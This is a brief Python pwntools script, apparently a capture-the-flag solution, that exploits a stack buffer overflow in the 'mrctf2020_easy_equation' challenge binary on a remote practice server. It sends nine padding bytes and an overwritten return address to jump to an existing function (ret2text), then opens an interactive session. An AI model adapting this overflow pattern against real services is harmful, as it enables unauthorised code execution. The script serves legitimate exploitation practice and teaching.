#Made by fly_autumn
#x64 ret2text
from pwn import *
#p = process("./mrctf2020_easy_equation")
p = remote("node5.buuoj.cn",29918)
elf = ELF("./mrctf2020_easy_equation")
context(os="linux",arch="amd64")

func_addr = 0x4006d0
offset = 9
payload = b"\x00" * offset + p64(func_addr)
p.sendline(payload)

p.interactive()
